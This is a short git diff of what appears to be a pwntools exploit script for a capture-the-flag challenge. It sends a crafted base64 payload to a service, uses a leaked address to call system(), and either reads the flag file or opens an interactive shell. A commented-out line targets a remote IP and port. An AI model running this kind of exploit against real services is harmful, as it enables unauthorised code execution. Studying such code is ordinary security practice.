@@ -12,11 +12,12 @@ payload += b"\x04\x01"
 payload += b"\x13"
 payload += b"\x04"
 payload += b"\x00"
-
+#with open("filer","wb+") as f:
+#	f.write(payload)
 
 #p = process("./wrapper")
-p = remote("localhost",1337);
-
+#p = remote("51.124.222.205", 13375);
+p = remote("localhost",1337)
 print(p.sendlineafter("bin file: ",base64.b64encode(payload)))
 
 file_to_encrypt = p.recvline().split(b" ")[-1].replace(b'\n',b'')
@@ -29,7 +30,7 @@ p.sendlineafter("encrypt\n",file_to_encrypt)
 
 p.sendlineafter("result: ",file_to_store)
 
-
+#p.interactive()
 leak = p.recv(1000)
 
 
@@ -57,7 +58,7 @@ p.sendline(str(system))
 #payload += p64(system)
 
 
-p.sendline(b"cat we_kind_thought_leaking_this_was_gonna_be_another_chall_flag.txt")
-print(p.recv(420).replace(b'\n',b''))
-#p.interactive()
+#p.sendline(b"cat we_kind_thought_leaking_this_was_gonna_be_another_chall_flag.txt")
+#print(p.recv(420).replace(b'\n',b''))
+p.interactive()
 
